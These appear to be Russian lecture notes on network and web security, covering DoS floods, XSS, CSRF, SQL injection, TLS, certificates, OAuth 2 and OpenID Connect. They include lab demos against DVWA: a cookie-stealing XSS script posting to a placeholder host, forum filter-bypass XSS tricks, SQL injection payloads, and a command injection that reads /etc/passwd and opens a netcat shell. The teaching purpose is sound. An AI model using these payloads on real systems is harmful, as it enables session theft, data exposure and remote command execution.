# Безопасность передачи данных

## Угрозы в сети

### DDoSDoS-атака (Denial of Service)

Закидывание неугодных ресурсов различным флудом, приводящее их к нокдауну. Если атака выполняется одновременно с
большого числа компьютеров, говорят о DDoS-атаке (Distributed Denial of Service).

Классификация:

### HTTP-флуд

Атакующий шлёт маленький по объёму HTTP-пакет, но такой, чтобы сервер ответил на него пакетом, размер которого в сотни
раз больше. Передаваемые заголовки могут варьироваться, что делает сложнее задачу выявления атаки. Использование HTTPS
так же усложняет задачу, т.к. для выполнения запроса его нужно сначала расшифровать, а на это так же тратятся ресурсы.

![HTTP flood](images/http_flood.png)

Защита: установить перед web-сервером nginx для кэширования запросов.

#### UDP-флуд

Злоумышленник отправляет большое количество пакетов на сервер с целью превысить пропукную способность оборудования.
Атака состоит из следующих шагов:

1. сервер получает UDP пакет на какой-то порт;
1. проверяет есть ли программа, которая слушает этот порт;
1. если программы нет, то сервер отвечает ICMP (ping) что `destination was unreachable`.

![UDP flood](images/udp_flood.png)

Защита: выставляет firewall, который режет UDP пакеты ко всем портам, кроме тех, на которых запущены приложения.

#### ICMP-флуд

Как и в случае с UPD, атака направлена на превышение пропускной способости оборудования. Атака симметричная, адрес
отпарвителя обычно не маскируется. Для атаки часто используются устройства интернета вещей с большой пропускной
способностью (например, IP камеры).

![ICMP flood](images/icmp_flood.png)

Защита: для того, чтобы защититься от ICMP-флуда нужно отключить ответы на запросы ICMP ECHO.

#### SYN-флуд

Для описания её действия можно остановиться на рассмотрении двух систем А и В, которые хотят установить между собой TCP
соединение, после которого они смогут обмениваться между собой данными. На установку соединения выделяется некоторое
количество ресурсов, этим и пользуются DoS-атаки. Отправив несколько ложных запросов, можно израсходовать все ресурсы
системы, отведённые на установление соединения. Рассмотрим подробнее, как это происходит. Хакер с системы А отправляет
пакет SYN системе В, но предварительно поменяв свой IP-адрес на несуществующий. Затем, ничего не подозревая, компьютер В
отправляет ответ SYN/ACK на несуществующий IP-адрес и переходит в состояние SYN-RECEIVED. Так как сообщение SYN/ACK не
дойдет до системы А, то компьютер В никогда не получит пакет с флагом ACK. Данное потенциальное соединение будет
помещено в очередь, из которой оно будет удалено по истечению какого-то времени. Этим пользуются злоумышленники и
отправляют сразу несколько пакетов SYN на компьютер жертвы, чтобы полностью исчерпать ресурсы системы.

![SYN flood](images/syn_flood.png)

Защита: отключение очереди "полуоткрытых" TCP-соединений.

#### Отраженная атака

Атака использует протокол синхронизации времени NTP для переполнения пропускной способности сети. В атаке NTP
используются как усиливающие сервера. На них делается запрос `monlist`, а адрес ответа подменяется на адрес атакуемого
сервиса. Атака состоит из следующих шагов:

1. Злоумышленник использует ботнет для отправки UDP-пакетов с поддельными ip адресами на NTP сервер, на котором включена
   команда `monlist`. Поддельный IP адрес в каждом пакете указывает на настоящий ip адрес жертвы.
1. Каждый пакет UDP делает запрос к серверу NTP с помощью своей команды `monlist`, что приводит к большому отклику.
1. Затем сервер отвечает на поддельный адрес полученными данными.
1. IP адрес цели получает ответ, и окружающая сетевая инфраструктура оказывается перегруженной потоком трафика, что
   приводит к отказу в обслуживании.

```
monlist is a debugging command that allows to retrieve information from the monitoring facility about traffic
associated with the NTP service.

The reference implementation of NTP [...] allows users to request a list of hosts with which the NTP daemon ntpd
communicated recently. The list, called "monlist" has a size limit of 600 entries and contains the IP addresses
of the last NTP clients or servers the instance has talked to.
```

![NTP attack](images/ntp_attack.png)

[What was/is the purpose of the 'MONLIST' command in NTP?](https://security.stackexchange.com/a/151451)

Защита:

1. Отключаем команду `monlist`.
1. Включаес фильтрацию входного траффика, т.к. внешний входящий запрос имеет ip адрес жертвы внутри сети.

### Подготовка тестового примера

Для демонстрации будем использовать
сборку [Damn Vulnerable Web Application](https://app.vagrantup.com/mmckinst/boxes/dvwa)
для [Vagrant](https://www.vagrantup.com/).

```shell
cd examaple
# Запускаем Damn Vulnerable Web Application на порту VM 80 -> Host 8080
vagrant up
```

Открываем браузер по адресу [http://localhost:8080](http://localhost:8080), вводим `admin`:`password`, переходим на
вкладку `Setup / Reset DB` и нажимаем `Create / Reset Database`. Потом переходим во вкладку `DVWA Security` и выбираем
уровень
`low` -> `submit`.

### Main-In-The-Middle

Атака посредника или атака Man in the middle (MITM) — вид атаки в криптографии, когда злоумышленник перехватывает и
подменяет сообщения, которыми обмениваются корреспонденты, причём ни один из последних не догадывается о его присутствии
в канале. Используется для прослушки или подмены передаваемых сообщений.

### XSS

XSS атаки – представляет собой уязвимость web-приложений, которая позволяет внедрение вредоносного кода в WEB-страницы,
просматриваемые другими пользователями. XSS атаки - это атаки не на сам сайт, а на пользователей сайта. Чаще всего XSS
используют для кражи Cookies, т.к. в них иногда хранят какую-нибудь ценную информацию (иногда даже логин и пароль (или
его хэш) пользователя), но самой опасной является кража активной сессии.

Делается это с помощью кода:

```javascript
<script>
    var іmg = new Image();
    іmg.srс = 'http://site/xss.php?' + document.cookie;
</script>
```

Так же подобной механикой можно добиться простой DDoS атаки на некоторый сайт:

```html
<img alt="simple image" src="http://site.com/">
```

Существует два типа XSS уязвимостей — пассивная и активная.

* Пассивные - это XSS, которые требуют от жертвы непосредственного участия. Например, заставить пользователя перейти по
  ссылке: `http://www.site.com/page.php?var=<script>document.cookie</script>`.
* Активные - это XSS, которые, не требуют никаких дополнительных действий со стороны жертвы – ей достаточно лишь открыть
  страницу с вашим XSS и js выполнится автоматически.

К примеру просмотрим форум на наличие использования тегов [font],[img],[url] и попытаться вставить в них скрипт или
комбинировать их:

```html
[img]https://...ru/1.jpg[/img]
```

Если выходит крестик, значит img используется и мы его подобрали. Если крестика нет, а висит всего надпись, то
попробуйте еще так:

```html
[img src=https://...ru/1.jpg]
```

Предположим, мы добились крестика этим:

```html
[img]https://...ru/1.jpg[/img]
```

Проверим держит ли фильтр пробел, добавляем пробел после расширения jpg:

```html
[img]https://...ru/1.jpg [/img]
```

Если крестик есть - тогда всё ОК. Далее существуют у img параметры dynsrc и lowsrc которые держат js. Пытаемся к примеру
вставить:

```html
[img]https://...ru/1.jpg dynsrc=javascript:alert()[/img]
```

Проверяем и отсылаем. Если появиться сообщение – значит нашли активную XSS и вместо `alert()` можете вставить любой
скрипт. Если фильтр не сдался попробуйте так:

```html
[img]https://...ru/"/dynsrc="javascript:alert()"/1.jpg[/img]
```

или

```html
[img]https://...ru/"/dynsrc=javascript:alert()/1.jpg[/img]
```

Если с приведённых примеров получился крестик, то `httрs://...ru/1.jpg` заменяем на адрес сниффера.

Примеры взяты из [XSS для новичков](https://forum.antichat.ru/threads/20140/).

Пример: переходим на вкладку `XSS (Reflected)`. Сайт берет данные из строки и без изменений подставляет в
блок `echo '<pre>Hello ' . $_GET[ 'name' ] . '</pre>';`.

```javascript
<script>alert(document.cookie)</script>
```

Переходим во вкладку `XSS (Stored)`. Сайт берет данные из поля message и в исходном виде вставляет в html страницу:

```javascript
<script>alert("Hello, world")</script>
<iframe src="http://www.cnn.com"></iframe>
```

### CSRF (Cross Site Request Forgery)

Вид атак на посетителей веб-сайтов, использующий недостатки протокола HTTP. Если жертва заходит на сайт, созданный
злоумышленником, от её лица тайно отправляется запрос на другой сервер, осуществляющий некую вредоносную операцию. Это
становится возможно потому что при запросе будут передаваться cookies, т.е. запрос будет воспринят как исходящий от
аутентифицированного пользователя. Cookie удостоверяют личность, но никак не гарантируют подлинность данных. Типичный
способ защиты сайтов – это секретный ключ – специальное значение, которое генерируется случайным образом и сохраняется в
сессии посетителя. Его знает только сервер, в браузере оно обычно хранится как скрытое поле на форме или в
Cookies.Спецификация протокола HTTP/1.1 определяет безопасные методы запросов, такие как GET, HEAD, которые не должны
изменять данные на сервере. Для таких запросов, при соответствии сервера спецификации, нет необходимости применять
защиту CSRF.

Пример: переходим во вкладку `CSRF`, вводим новый пароль `admin` и видим что запрос на смену пароля уходит как GET
запрос `http://localhost:8080/vulnerabilities/csrf/?password_new=test&password_conf=test&Change=Change` и в запросе
отправляются Cookie с сессией `PHPSESSID=eu5ebmk29rfl9g3rig10ljftr0`.

Возьмем страницу [test.html](example/test.html) с кнопкой `Show kittens`, которая будет отправлять запрос на сервер со
сменой пароля.

```javascript
function showKittens() {
    window.location = "http://localhost:8080/vulnerabilities/csrf/?password_new=test&password_conf=test&Change=Change"
}
```

### CORS (Cross-origin resource sharing)

Концепция, позволяющая AJAX-запросам выполняться только в рамках своего домена (Same Origin Policy). Эта мера направлена
для предотвращения CSRF-атак через AJAX. Поскольку CSRF-токен генерируется на сервере, на стороне клиента нет
возможности подписать сообщение.В кросс-доменный запрос браузер автоматически добавляет заголовок `Origin`, содержащий
домен, с которого осуществлён запрос. Сервер должен, со своей стороны, ответить специальными заголовками, разрешает ли
он такой запрос к себе. Если сервер разрешает кросс-доменный запрос с этого домена – он должен добавить к ответу
заголовок `Access-Control-Allow-Origin`, содержащий домен запроса или звёздочку '*'. По умолчанию ajax может прочитать
из ответа только базовые заголовки:

* Cache-Control;
* Content-Language;
* Content-Type;
* Expires;
* Last-Modified;
* Pragma.

Чтобы он мог прочитать какой-то еще HTTP-заголовок, сервер должен указать его имя в `Access-Control-Expose-Headers`.

По умолчанию браузер не передаёт с запросом cookie и авторизующие заголовки. Чтобы браузер передал вместе с запросом
cookie и HTTP-авторизацию, нужно поставить запросу `xhr.withCredentials = true`, а сервер должен подтвердить, что он их
примет с помощью заголовка: `Access-Control-Allow-Credentials: true`. Использование звёздочки '*'
в `Access-Control-Allow-Origin` при этом запрещено.

### SQL Injection (Внедрение SQL)

В зависимости от типа используемой СУБД и условий внедрения, может дать возможность атакующему выполнить произвольный
запрос к базе данных (например, прочитать содержимое любых таблиц, удалить, изменить или добавить данные), получить
возможность чтения и/или записи локальных файлов и выполнения произвольных команд на атакуемом сервере.Примеры атак:

* **Внедрение в параметры** – допустим, у нас есть некоторый скрипт, проверяющий авторизацию пользователей:

```sql
SELECT *
FROM users
WHERE login = '$1'
  AND password = '$2';
```

Если введены корректные данные, то запрос выполнится корректно и пользователь сможет войти на сайт. Если же было
введено  `' or 1=1 --'`, то в запросы мы получим:

```sql
SELECT *
FROM users
WHERE login = '' AND password = ''
   OR 1 = 1 --';
```

что дает любому пользователю войти на сайт.

* **Использование UNION** – SQL позволяет объединять результаты нескольких запросов при помощи оператора UNION. В
  примерах выше мы можем передать в качестве параметра `' UNION SELECT username, password FROM admin`.

```sql
SELECT *
FROM users
WHERE login = '$1'
  AND password = ''
UNION
SELECT username, password
FROM admin
```

Если запрос возвращает одну колонку, то можно использовать group_concat().

* **Расщепление SQL запроса** - для разделения команд в языке SQL используется символ ';' (точка с запятой). Внедряя
  этот символ в запрос, злоумышленник получает возможность выполнить несколько команд в одном запросе. Например, в
  запрос выше мы можем передать: `'; insert int admin (username, password) values ('foo', 'bar'); --'`, то в одном
  запросе будут выполнены две команды

```sql
SELECT *
FROM users
WHERE login = '$1'
  AND password = '';
INSERT INTO admin (username, password)
VALUES ('foo', 'bar'); --'
```

и в таблицу admin будет несанкционированно добавлена запись `foo:bar`. Для защиты от данного типа атак необходимо
тщательно фильтровать входные параметры, значения которых будут использованы для построения SQL-запроса. Так же все
приходящие с формы параметры должны иметь соответствующий тип, т.е. если ожидается id сущности, то её тип должен быть
int, а не string.

Пример: переходим на вкладку `SQL Injection` и вводим следующие данные:

```
%' and 1=0 union select null, concat(user,':',password) from users #
%' or '0'='0
%' and 1=0 union select null, table_name from information_schema.tables #
```

Пример: command injection. Переходим во вкладку `Command Injection` и вводим следующие данные:

```
192.168.1.106; cat /etc/passwd
```

```
192.168.1.106; mkfifo /tmp/pipe;sh /tmp/pipe | nc -l 4444 > /tmp/pipe
```

Подключаемся к localhost 4444 с локальной машины (порт 4444 проброшен из VM):

```shell
nc localhost 4444
date
whoami
```

## HTTPS

Любое действие в интернете — это обмен данными. Каждый раз, когда вы запускаете видеоролик, посылаете сообщение в
социальной сети или открываете сайт, ваш компьютер отправляет запрос к нужному серверу и получает от него ответ. Как
правило, обмен данными происходит по протоколу HTTP. Этот протокол не только устанавливает правила обмена информацией,
но и служит транспортом для передачи данных — с его помощью браузер загружает содержимое сайта на ваш компьютер или
смартфон. При всём удобстве и популярности HTTP у него есть один недостаток: данные передаются в открытом виде и никак
не защищены. На пути из точки А в точку Б информация в интернете проходит через десятки промежуточных узлов, и, если
хоть один из них находится под контролем злоумышленника, данные могут перехватить. Для установки безопасного соединения
используется протокол HTTPS с поддержкой шифрования. Защиту данных в HTTPS обеспечивает криптографический протокол
SSL/TLS, который шифрует передаваемую информацию. По сути этот протокол является обёрткой для HTTP. Он обеспечивает
шифрование данных и делает их недоступными для просмотра посторонними. Протокол SSL/TLS хорош тем, что позволяет двум
незнакомым между собой участникам сети установить защищённое соединение через незащищённый канал.

### TLS

TLS (Transport Layer Security) – это протокол защиты транспортного уровня. Он нужен для того, чтобы никто не мог вас
"прослушать" и узнать какую-то важную информацию (чаще всего пароли, если говорить о работе в сети). Установка
защищенного соединения делится на 3 этапа:

1. Согласование типа сертификата:
    1. Клиент отправляет Client Hello и перечисляет какие протоколы (cipher suites) он поддерживает, упорядоченные в
       приоритетном порядке.
    1. Клиент генерирует большое рандомное число (Random).
    1. В ответ сервер посылает Server Hello, где передает свою цепочку сертификатов, выбранный протокол и
       сгенерированное свое случайное число (Server Key Exchange).
    1. Клиент проверяет сертификат (цепочку подписей до корневого сертификата).
       ![Cipher Suite](images/cipher_suite.png)
1. Создание сессионного ключа:
    1. Если согласование ключей идет по протоколу RSA:
        1. После проверки протокола клиент генерирует pre-master ключ, шифрует его публичным ключом сервера и отправляет
           обратно.
        1. Сервер расшифровывает сообщение с помощью своего приватного ключа, на его основе строит Master Secret –
           генерируется из нескольких переменных составляющих: pre-master secret, ClientRandom и ServerRandom.
    1. Либо обмен ключами выполняется по протоколу Диффи-Хеллмана (сейчас стандарт).
1. Обмен зашифрованными данными.

Ниже показана наглядная схема обмена между двумя пользователями. Алиса и Боб хотят использовать общий ключ для
шифрования переписки.

![Key Exchange](images/key_exchange.png)
Рассмотрим детально этот процесс, используя краски вместо чисел:

1. Алиса и Боб выбрали общую краску;
1. Алиса и Боб выбрали по одной секретной краске;
1. Алиса и Боб смешали общую и секретную краску;
1. Алиса и Боб обменялись получившимися смешанными красками.
1. Алиса смешала полученную смешанную краску от Боба со своей секретной краской.
1. Боб смешал полученную смешанную краску от Алисы со своей секретной краской.
1. Теперь у Алисы и Боба есть общая секретная краска.

Обмен ключами на основе RSA имеет существенный недостаток: эта пара отрытого и закрытого ключей используется и для
аутентификации сервера. Соответственно, если злоумышленник получает доступ к закрытому ключу сервера, он может
расшифровать весь сеанс связи. Более того, злоумышленник может попросту записать весь сеанс связи в зашифрованном
варианте и занять расшифровкой потом, когда удастся получить закрытый ключ сервера. В то же время, обмен ключами
Диффи-Хеллмана представляется более защищённым, так как установленный симметричный ключ никогда не покидает клиента или
сервера и, соответственно, не может быть перехвачен злоумышленником, даже если тот знает закрытый ключ сервера. На этом
основана служба снижения риска компрометации прошлых сеансов связи: для каждого нового сеанса связи создаётся новый, так
называемый "временный" симметричный ключ. Соответственно, даже в худшем случае (если злоумышленнику известен закрытый
ключ сервера), злоумышленник может лишь получить ключи от будущих сессий, но не расшифровать ранее записанные.

### Сертификаты

Для гарантии того, что сервер является тем, за кого он себя выдает, являются цифровые сертификаты — электронный
документ, который использующийся для идентификации сервера. Сертификат подтверждает две вещи:

1. Лицо, которому он выдан, действительно существует.
1. Оно управляет сервером, который указан в сертификате.

Выдачей сертификатов занимаются центры сертификации. В сертификате содержатся данные о его владельце, в том числе имя (
или название организации), а также подпись, удостоверяющая подлинность сертификата. Web-браузер имеет встроенную систему
безопасности. В ходе этой процедуры web-браузер проверяет, чтобы:

* Доменное имя в сертификате соответствовало тому домену, от которого идет запрос на защищенное соединение.
* Сертификации, подписавший сертификат домена, входил в число доверенных вашего web-браузера.
* Сертификат не был просрочен.

Если вы пытаетесь зайти на web-сайт, который имеет проблемы с сертификатом, система безопасности может выдать
предупреждение. Пользователь будет информирован, что сайт использует защищенный протокол, однако никакая третья сторона
не гарантирует вам того, что вы работаете на web-сервере именно той компании, с которой хотите иметь дело и что Ваша
информация не будет получена кем-то другим. Обмен данными начинается только в том случае, если проверка прошла успешно.
Если вернуться к аналогии с ящиком и замками, цифровой сертификат позволяет убедиться в том, что замок вашего
собеседника на ящике принадлежит именно ему. Что это уникальный замок, который невозможно подделать. Таким образом, если
кто-то посторонний попытается вас обмануть и пришлёт ящик со своим замком, вы легко это поймёте, ведь замок будет
другой.

SSL-сертификаты делятся на:

* **Самоподписанные (Self-Signed)** – для тестирования на локальной машине можно создать самоподписанный
  сертификат. [How To Create a Self-Signed SSL Certificate for Nginx in Ubuntu 18.04](https://www.digitalocean.com/community/tutorials/how-to-create-a-self-signed-ssl-certificate-for-nginx-in-ubuntu-18-04)
  .
* **Сертификат, полученный в центре сертификации** – Центр сертификации (CA) – организация, обладающая правом выдачи
  цифровых сертификатов. Перед выдачей сертификата она проверяет данные, содержащиеся в нем. В самых простых
  сертификатах проверяется только соответствие доменного имени, в самых дорогих производится целый ряд проверок самой
  организации, которая запрашивает сертификат.

Сертификаты деляться по типу валидации:

* Сертификаты, которые подтверждают только доменное имя (Domain Validation — DV) – это самые простые сертификаты, это
  ваш выбор если сертификат вам нужен срочно, так как выпускаются они автоматически и моментально. При проверке такого
  сертификата отсылается письмо со специальной ссылкой, по которой нужно кликнуть, чтобы подтвердить выпуск сертификата.
* Сертификаты, которые подтверждают домен и организацию (Organization Validation — OV) – в таком сертификате уже будет
  указано название организации. После получения запроса на выпуск сертификата с проверкой организации центр сертификации
  производит проверку, реально ли существует такая организация, как указано в CSR и принадлежит ли ей указанный домен.

  ![OV digitalocean.com](images/ov_digitalocean.com.png)
* Сертификаты, с расширенной проверкой (Extended Validation — EV) – SSL сертификаты с расширенной проверкой (EV)
  выпускаются только когда центр сертификации (CA) выполняет две проверки, чтобы убедиться, что организация имеет право
  использовать определенный домен плюс центр сертификации выполняет тщательную проверку самой организации. Процесс
  выпуска сертификатов EV стандартизирован и должен строго соотвествовать правилам EV, которые были созданы на
  специализированном форуме CA/Browser Forum в 2007 году. Там указаны необходимые шаги, которые центр сертификации
  должен выполнить перед выпуском EV сертификата:
    * Должен проверить правовую, физическую и операционную деятельности субъекта.
    * Должен убедиться, что организация соответствует официальным документам.
    * Необходимо убедиться, что организация имеет исключительное право на использование домена, указанного в сертификате
      EV.
    * Необходимо убедиться, что организация полностью авторизована для выпуска EV сертификата.

  ![CV paypal.com](images/ev_paypal.com.png)

HTTPS не всегда обоснован, в основном для работы в локальной сети организации. При передаче информации по HTTPS нельзя
использовать кэширование, передается большее количество данных по сети и используется больше вычислительной мощности для
шифровки/расшифровки сообщений.

## Авторизация и Аутентификация

Идентификация — это заявление о том, кем вы являетесь. В зависимости от ситуации, это может быть имя, адрес электронной
почты, номер учетной записи, итд.

Аутентификация (Authentication – реальный, подлинный) – процесс подтверждения того, что сторона, заявившая о себе,
таковой на самом деле и является. Для человека аутентификация обычно сводится к набору имени и пароля. Предполагается,
что только этот человек имеет доступ к такой информации и потому лицо, набравшее её, и должно быть данным человеком.
Авторизация –  (Authorization — разрешение) — предоставление определённому лицу или группе лиц прав на выполнение
определённых действий, а также процесс проверки (подтверждения) данных прав при попытке выполнения этих действий.

### Способы аутентификации

* **Аутентификация по паролю**.
* **HTTP authentication** – сервер, при обращении неавторизованного клиента к защищенному ресурсу, отсылает HTTP
  статус `401 Unauthorized` и добавляет заголовок `WWW-Authenticate` с указанием схемы и параметров аутентификации.
  Браузер, при получении такого ответа, автоматически показывает диалог ввода username и password. Пользователь вводит
  детали своей учетной записи. Во всех последующих запросах к этому веб-сайту браузер автоматически добавляет HTTP
  заголовок `Authorization`, в котором передаются данные пользователя для аутентификации сервером.
    * Basic — наиболее простая схема, при которой username и password пользователя передаются в заголовке Authorization
      в незашифрованном виде (base64-encoded).
    * Digest — challenge-response-схема, при которой сервер посылает уникальное значение nonce, а браузер передает MD5
      хэш пароля пользователя, вычисленный с использованием указанного nonce. Более безопасная альтернативв Basic схемы
      при незащищенных соединениях. Но использование этой схемы не позволяет применить современные хэш-функции для
      хранения паролей пользователей на сервере.
* **Аутентификация по сертификатам** – сертификат представляет собой набор атрибутов, идентифицирующих владельца,
  подписанный Certificate Authority (CA). CA выступает в роли посредника, который гарантирует подлинность сертификатов (
  по аналогии с ФМС, выпускающей паспорта).
* **Social login** – способ аутентификации, при котором информацию о пользователе получаем из социальных сетей.
* **Аутентификация по одноразовым паролям**.
    * Аппаратные или программные токены, которые могут генерировать одноразовые пароли на основании секретного ключа,
      введенного в них, и текущего времени. Секретные ключи пользователей, являющиеся фактором владения, также хранятся
      на сервере, что позволяет выполнить проверку введенных одноразовых паролей.
    * Случайно генерируемые коды, передаваемые пользователю через SMS или другой канал связи. Например, через Google
      Authenticator.
    * Распечатка или scratch card со списком заранее сформированных одноразовых паролей. Для каждого нового входа в
      систему требуется ввести новый одноразовый пароль с указанным номером.
* **Token-Based Authorization** – авторизованный пользователь создает специальный ключ, который будет выступать в роли
  подтверждения логина/пароля. Обычно имеет ограниченный набор операций и выступает как замена пароля. Часто передается
  в заголовке вида `Authorization: Bearer <token>`.
* **Двухфакторная авторизация** – помимо логина и пароля используется подтвержение одноразовым паролем, способы
  получения которых описаны выше.
* **Single Sign On (SSO)** – единая платформа авторизации, которая дает доступ к различным ресурсам экосистемы.
  Например, при авторизации на одном из сервисов Google, у вас поялвется доступ до других сервисов без необходимости
  повторно проходить авторизацию.

### OAuth 2

Как и первая версия, OAuth 2.0 основан на использовании базовых веб-технологий: HTTP-запросах, редиректах и т.п.
Ключевое отличие от OAuth 1.0 — простота. В новой версии нет громоздких схем подписи, сокращено количество запросов,
необходимых для авторизации. Так же, в отличии от OAuth 1.0 в OAuth 2.0 установлено время жизни токена и существует
механизм для его обновления. Последовательность работы:

1. Клиентское приложение имеет Application Key и Secret Key (Shared Key - известный только сервису и приложению).
1. Выполняется редирект на страницу сервиса, при этом передается только Redirect URI, Response Type (code) и Client ID.
   Часто для предотвращение CSRF атак в запросе передается State.
1. Сервер запрашивает у пользователя логин и пароль, и в случае успешной аутентификации просит пользователя подтвердить
   доступ клиента к ресурсам, после чего пользователь перенаправляется сервером к клиенту на адрес, указанный в Redirect
   URI с добавлением поля code, требующегося на втором шаге. Если в запросе был указан State, то он так же возвращается
   в редиректе.
1. На втором шаге клиентский сервер запрашивает обмен полученного на первом шаге Code на Access Token. Для этого
   передается сам Code, Application Key и Secret Key (иногда передается как Basic Authorization).
1. В ответ клиент получает:
    * `Access Token` – ключ, использующийся для вызова защищенного API.
    * `Expires In` – время жизни токена.
    * `Token Type` – тип токена (всегда Bearer).
    * `Refresh Token` – ключ, использующийся для обновление Access Token при истечении его срока действия.

![OAuth2](images/oauth2.png)

При запросе к защищенным ресурсам в хедер `Authorization`
записывается `<Token Type> <Access Token>` (`Authorization: Bearer <Token>`).

Стандарт не определяет формат токена, который получает приложение: в сценариях, адресуемых стандартом, приложению нет
необходимости анализировать токен, т. к. он лишь используется для получения доступа к ресурсам. Поэтому ни токен, ни
grant сами по себе не могут быть использованы для аутентификации пользователя. Однако если приложению необходимо
получить достоверную информацию о пользователе, существуют несколько способов это сделать:
зачастую API сервера ресурсов включает операцию, предоставляющую информацию о самом пользователе (например, /me в
Facebook API). Приложение может выполнять эту операцию каждый раз после получения токена для идентификации клиента.
Такой метод иногда называют псевдо-аутентификацией.

Пример получения OAuth 2 токена
на [dropbox.com](https://dropbox.com) [Dropbox OAuth 2 guide](https://developers.dropbox.com/ru-ru/oauth-guide):

Заходим на [App Console](https://www.dropbox.com/developers/apps/create), создаем новое
приложение `[rsoi] Simple Test App`, в Redirect URIs указываем `https://ya.ru/callback`, копируем App key и App secret.
В блоке Permissions включить scope `sharing.read` для доступа к методу `https://api.dropboxapi.com/2/users/get_account`.

```http request
https://www.dropbox.com/oauth2/authorize?client_id={{client_id}}&response_type=code&redirect_uri=https://ya.ru/callback
```

Будет запрошена страница авторизации и предоставления прав доступа.

![Dropbox Login Page](images/dropbox_login.png)
![Dropbox Permission Page](images/dropbox_permissions.png)

После успешной авторизации будет переход на callback
url `https://ya.ru/callback?code=u-IWrPBgmAcAAAAAAAADu7RmRc83VpQVsNaHF03exCk` с кодом в query параметрах. После этого
выполняем запрос на обмен code на token.

```shell
curl --location --request POST 'https://api.dropboxapi.com/oauth2/token?code=<code>&grant_type=authorization_code&redirect_uri=https://ya.ru/callback' \
--header 'Authorization: Basic base64(`App Key`:`App Secret`)'

{
  "uid": "17132370",
  "access_token": "<token>",
  "expires_in": 14400,
  "token_type": "bearer",
  "scope": "account_info.read sharing.read",
  "account_id": "<account id>"
}
```

Берем токен и делаем запрос на получение данных:

```shell
curl --location --request POST 'https://api.dropboxapi.com/2/users/get_account' \
--header 'Content-Type: application/json' \
--header 'Authorization: Bearer <token>' \
--data-raw '{ "account_id": "<account id>" }'

{
    "account_id": "<account id>",
    "name": {
        "given_name": "Alex",
        "surname": "Romanow",
        "familiar_name": "Alex",
        "display_name": "Alex Romanow",
        "abbreviated_name": "AR"
    },
    "email": "romanowalex@mail.ru",
    "email_verified": true,
    "profile_photo_url": "<url>",
    "disabled": false,
    "is_teammate": true
}
```

#### OAuth 2 grant types

* **Authorization code** – самый распространенный тип, используется сервер.
  ```
  callback?code=AUTHORIZATION_CODE, code -> token
  ```
* **Implicit** – используется мобильными или веб-приложениями (приложения, работающие на устройстве пользователя).
  ```
  callback#token=ACCESS_TOKEN
  ```
* **Resource owner credentials** – при этом типе разрешения на авторизацию пользователь предоставляет приложению
  напрямую свои авторизационные данные в сервисе (имя пользователя и пароль). Этот тип разрешения стоит использовать
  только в случае, когда приложение пользуется доверием пользователя (например, является частью самого сервиса, или
  операционной системы пользователя).
  ```
  token?grant_type=password&username=USERNAME&password=PASSWORD&client_id=CLIENT_ID
  ```
* **Client credentials** – тип разрешения на авторизацию с использованием учётных данных клиента позволяет приложению
  осуществлять доступ к своему собственному аккаунту сервиса. Это может быть полезно, например, когда приложение хочет
  обновить собственную регистрационную информацию на сервисе или URI перенаправления, или же осуществлить доступ к
  другой информации, хранимой в аккаунте приложения на сервисе, через API сервиса.
  ```
  token?grant_type=client_credentials&client_id=CLIENT_ID&client_secret=CLIENT_SECRET
  ```

### OpenID Connect

OpenID Connect фактически представляет собой расширение протокола OAuth 2. Он добавляет слой аутентификации поверх слоя
авторизации. На деле это выглядит как дополнительное поле id_token, содержащее базовую информацию о профиле, приходящее
вместе с `access_token`. Параметр `id_token` представляет простой способ, чтобы убедиться, что данные, полученные
клиентом, не были изменены. Параметр подписывается сервером, используя клиентский ключ, который был ранее передан через
доверенный канал. Эта кодировка называется JWT (JSON Web Token).

#### JWT

JWT состоит из трех частей, разделенных точкой:
Например запрос:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ
```

Содержит:
Первая часть — заголовок (Header), это JSON объект закодированный Base64url и описывающий алгоритм и тип токена:

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

Вторая часть — полезная нагрузка (Payload), это так-же JSON объект закодированный Base64url:

```json
{
  "sub": "1234567890",
  "name": "John Doe",
  "admin": true
}

```

Третью часть (Signature) сервер получил следующим образом:

```
HS256(base64UrlEncode(первая часть) + "." + base64UrlEncode(вторая часть), клиентский_ключ)
```

#### Discovery

Спецификация OpenID Connect предоставляет некоторый endpoint, служащий для динамической настройки авторизации – на
запрос на некоторый uri `https://<openid-provider>/.well-known/openid-configuration` в ответ приходит json, содержащий в
себе сведения о endpoint’ах получения кода, токена и прочих параметров, участвующих в авторизации. Например:

```shell
curl https://accounts.google.com/.well-known/openid-configuration -s | jq
{
  "issuer": "https://accounts.google.com",
  "authorization_endpoint": "https://accounts.google.com/o/oauth2/v2/auth",
  "device_authorization_endpoint": "https://oauth2.googleapis.com/device/code",
  "token_endpoint": "https://oauth2.googleapis.com/token",
  "userinfo_endpoint": "https://openidconnect.googleapis.com/v1/userinfo",
  "revocation_endpoint": "https://oauth2.googleapis.com/revoke",
  "jwks_uri": "https://www.googleapis.com/oauth2/v3/certs",
  "response_types_supported": [
    "code",
    "token",
    "id_token",
    "code token",
    "code id_token",
    "token id_token",
    "code token id_token",
    "none"
  ],
  "subject_types_supported": [
    "public"
  ],
  "id_token_signing_alg_values_supported": [
    "RS256"
  ],
  "scopes_supported": [
    "openid",
    "email",
    "profile"
  ],
  "token_endpoint_auth_methods_supported": [
    "client_secret_post",
    "client_secret_basic"
  ],
  "claims_supported": [
    "aud",
    "email",
    "email_verified",
    "exp",
    "family_name",
    "given_name",
    "iat",
    "iss",
    "loale",
    "name",
    "picture",
    "sub"
  ],
  "code_challenge_methods_supported": [
    "plain",
    "S256"
  ],
  "grant_types_supported": [
    "authorization_code",
    "refresh_token",
    "urn:ietf:params:oauth:grant-type:device_code",
    "urn:ietf:params:oauth:grant-type:jwt-bearer"
  ]
}

```

#### Dynamic Register

Клиент может не быть зарегистрирован на сервере, т.е. не иметь Application Key и Secure Key. Для этого в OpenID Connect
введена динамическая регистрация – клиент может сделать HTTP POST запрос на адрес регистрации сервера с `redirect_uri` и
другими специфичными параметрами. Для обеспечения динамической ассоциации, сервер включает в себя следующие параметры
ответа json:

```json
{
  "client_id": "идентификатор клиента",
  "client_secret": "ключ клиента, изменяется с каждым ответом",
  "expires_at": "время жизни, 0 если не устаревает",
  "registration_client_uri": "uri для управления регистрационными данными",
  "registration_access_token": "token, использующийся для доступа к registration_client_uri"
}
```

### Single Sign On (SSO)

